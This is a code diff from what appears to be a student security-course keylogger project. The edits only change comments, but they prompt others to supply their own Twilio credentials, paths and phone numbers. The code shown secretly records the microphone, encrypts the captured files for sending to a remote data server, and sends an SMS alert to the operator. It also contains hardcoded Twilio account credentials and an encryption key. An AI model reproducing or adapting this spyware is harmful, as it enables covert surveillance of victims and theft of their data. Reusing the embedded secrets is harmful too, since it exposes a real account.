@@ -41,16 +41,16 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-#Twilio Account setup
+#Twilio Account setup (P.S put in your Twilio's account SID & Auth_token)
 account_sid = "AC0960b5d0c34e7b0606ffcafe1cd85fbd"
 auth_token ="dbfe2e69a6b62a2d5f38c24c70daaecf"
 client = Client(account_sid, auth_token)
 username = getpass.getuser()
 
-#Encryption key setup : Generate and paste the key from the encryption-decryption folder
+#Encryption key setup: Generate and paste the key from the encryption-decryption folder
 key = "w4eLP7fMuJwYoRJyqbpfkn2LSQNWYiDNy2KooG26SSE="
 
-#File path destination to store the generated files
+#File path destination to store the generated files (P.S put in your custom folder path)
 file_path = "/Users/van/Documents/UNSW/Courses/Year 1/Y1 Term 3/COMP6441 - Security Engineering/UNSW-T3-COMP6441/Assignments/Final Deliverable/Advanced Keylogger"
 extend = "/"
 file_merge = file_path + extend
@@ -77,6 +77,7 @@ def microphone():
     seconds = microphone_time
     print("Devices available:",sd.query_devices())
     sd.query_devices()
+    #Setting the default device based on the OS's available devices (P.S change the default device based on your OS)
     sd.default.device = 'MacBook Air Microphone'
     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
     sd.wait()
@@ -146,7 +147,7 @@ for encrypting_file in files_to_encrypt:
         print("Encrypted data files created to be sent :",encrypted_file_names[count])
         f.write(encrypted)
         print("Encrypted data :",encrypted)
-    #Send an SMS to say that the encrypted files are sent to the data server
+    #Send an SMS to say that the encrypted files are sent to the data server (P.S put in your own number / any phone number)
     message = client.messages \
     .create(
         body='Encrypted files sent to the server! Login to your account to access!',
